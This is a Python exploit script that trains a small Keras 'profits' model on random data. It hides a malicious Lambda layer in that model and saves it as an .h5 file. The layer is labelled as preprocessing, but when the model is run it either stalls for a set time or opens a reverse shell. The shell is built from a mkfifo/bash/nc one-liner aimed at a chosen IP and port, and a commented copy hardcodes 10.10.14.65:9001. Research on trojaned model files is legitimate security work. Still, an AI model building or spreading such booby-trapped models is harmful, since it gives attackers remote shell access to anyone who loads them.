import sys
import os
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers


np.random.seed(42)

def print_usage():
    print("\nUsage:")
    print("  python exp.py sleep [seconds]")
    print("    - Activates sleep malicious layer (default: 5 seconds)")
    print("  python exp.py reverse_shell <ip> <port>")
    print("    - Activates reverse shell malicious layer")

# Malicious function disguised as a preprocessing layer
def malicious_layer_sleep(second):
    def sleep_func(x):
        # This will execute when the model is loaded
        import time
        import os
        if os.getenv("BUILD_PAYLOAD") != "1":
            try:
                time.sleep(int(second))  # Simulate a delay to mimic malicious behavior
            except Exception as e:
                print(f"Error: {str(e)}")
        
        # Return the input unchanged to maintain normal operation
        return x
    return sleep_func
# Malicious function disguised as a preprocessing layer
def malicious_layer_revere_shell(ip, port):
    def shell_func(x):
        # This will execute when the model is loaded
        import subprocess
        import os
        
        if os.getenv("BUILD_PAYLOAD") != "1":
            try:
                # result = subprocess.run('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.65 9001 > /tmp/f', shell=True, capture_output=True, text=True)
                result = subprocess.run(f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc {ip} {port} > /tmp/f', shell=True, capture_output=True, text=True)
            except Exception as e:
                print(f"Error: {str(e)}")
        
        # Return the input unchanged to maintain normal operation
        return x
    return shell_func
output = None

if len(sys.argv) < 2:
    print_usage()
    sys.exit(1)
if sys.argv[1] == "sleep":
    print("Using sleep malicious layer")
    time_sleep = sys.argv[2] if len(sys.argv) > 2 else "5"
    payload = "sleep"
    output = "profits_model_sleep.h5"
elif sys.argv[1] == "reverse_shell":
    print("Using reverse shell malicious layer")
    if len(sys.argv) < 4:
        print("Usage: python exp.py reverse <ip> <port>")
        exit(1)
    ip = sys.argv[2]
    port = sys.argv[3]
    payload = "reverse_shell"
    output = "profits_model_reverse_shell.h5"
else:
    print("Invalid argument. Use 'sleep' or 'reverse_shell'.")
    exit(1)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

os.environ["BUILD_PAYLOAD"] = "1"
# Build the model with hidden malicious layer
if payload == "sleep":
    model = keras.Sequential([
        layers.Lambda(malicious_layer_sleep(time_sleep) , input_shape=(1,)),  # Malicious layer
        layers.Dense(64, activation='relu'),
        layers.Dense(1)
    ])
elif payload == "reverse_shell":
    model = keras.Sequential([
        layers.Lambda(malicious_layer_revere_shell(ip, port), input_shape=(1,)),  # Malicious layer
        layers.Dense(64, activation='relu'),
        layers.Dense(1)
    ])


# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save(output)